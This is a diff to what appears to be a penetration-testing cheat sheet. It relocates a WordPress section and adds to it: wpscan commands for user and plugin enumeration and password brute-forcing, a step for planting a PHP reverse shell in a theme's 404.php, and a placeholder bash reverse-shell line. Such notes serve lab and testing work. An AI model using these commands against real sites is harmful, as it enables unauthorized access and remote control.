@@ -181,14 +181,6 @@ run getgui -u [USER_NAME] -p [PASS]
 ### Extracting information from repository
 `./extractor.sh <location_folder_having_.git_init> <extract_to_a_folder>`
 
-# Wordpress
-using wpscan we can find users or do some further enumeration of wordpress version
-* `wpscan -e --url http://<ip>/wordpress -e u` Enumerate Users
-* `wpscan -e --url http://<ip>/wordpress -e ap` Enumearte All plugins
-
-To bruteforce passwords
-* `wpscan --url <ip> -U user_file_path -P password_file_path`
-
 # Web
 ### XSS to RCE
 ```
@@ -212,6 +204,19 @@ Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_his
 
 ### Web Shell Bash
 `bash -c "<bash_rev_shell>"`
+
+
+### Wordpress
+using wpscan we can find users or do some further enumeration of wordpress version
+* `wpscan -e --url http://<ip>/wordpress -e u` Enumerate Users
+* `wpscan -e --url http://<ip>/wordpress -e ap` Enumearte All plugins
+
+To bruteforce passwords
+* `wpscan --url <ip> -U user_file_path -P password_file_path`
+
+After logging into the wordpress dashboard , we can edit theme's 404.php page with a php revershell
+`http://<ip>/wordpress/wp-content/themes/twentytwenty/404.php`
+
 # Wordlists
 
 ### Directory Bruteforcing
